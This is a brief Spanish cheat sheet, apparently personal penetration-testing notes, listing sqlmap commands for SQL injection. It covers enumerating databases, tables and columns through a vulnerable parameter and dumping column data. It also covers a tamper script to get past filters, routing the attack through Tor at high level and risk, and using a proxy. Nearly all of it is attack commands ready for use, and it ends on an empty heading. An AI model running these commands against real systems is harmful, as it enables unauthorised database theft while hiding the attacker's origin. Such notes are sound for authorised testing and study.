# Comandos básicos de la herramienta SQLMAP

#### DB
- Devuelve todas las bases de datos
```SQL
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln --dbs --tamper=space2comment
```
#### Tabla
- Devuelve las tablas de una DB específica
```SQL
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name --tables
```
#### Columnas
- Devuelve las columnas de una DB y tabla específica
```SQL
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name --columns
```
#### Datos
- Devuelve los DATOS de una columna específica
```SQL
sqlmap -r /home/kali/sqli.txt -v 3 -p parametro_vuln -D DB_name -T Table_name  --dump -C name,name,name
```
# Usar TOR con SQLMap 
```SQL
sqlmap -u 'http://www.example.com' --tor --tor-type=SOCK5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```
# Usar un PROXY con SQLMap 
```SQL
sqlmap -u 'http://www.example.com' --proxy='https://127.0.0.1:8080'
```
# SQLMap en una solicitud HTTP

